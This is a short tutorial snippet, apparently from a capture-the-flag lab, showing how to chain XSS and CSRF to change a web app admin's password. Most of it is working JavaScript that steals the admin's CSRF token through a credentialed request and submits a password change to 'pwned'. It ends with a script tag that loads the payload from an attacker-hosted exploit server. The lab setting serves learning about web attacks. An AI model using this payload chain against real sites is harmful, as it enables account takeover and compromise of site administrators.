In this example we will write a **XSS+CSRF** to change an admin password remotely. The app uses a csrf_token for the password change so we can't guess it anyway! You may want to adapt the code to match the right elementid, url, csrf tokens mm

1)Prepare the CSRF to read the csrf of the admin and perform a password reset of the admin(host it on your exfiltration server...)
```
// GET CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);
```
**Change PW**
```
var csrf_req = new XMLHttpRequest();
var params = `username=admin&email=admin@vulnerablesite.htb&password=pwned&csrf_token=${csrftoken}`;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```
2)Send the XSS that tells the victim to fetch your payload
```
<script src="http://exploitserver.htb/exploit"></script>
```
3)After short you should be able to login with you chosen password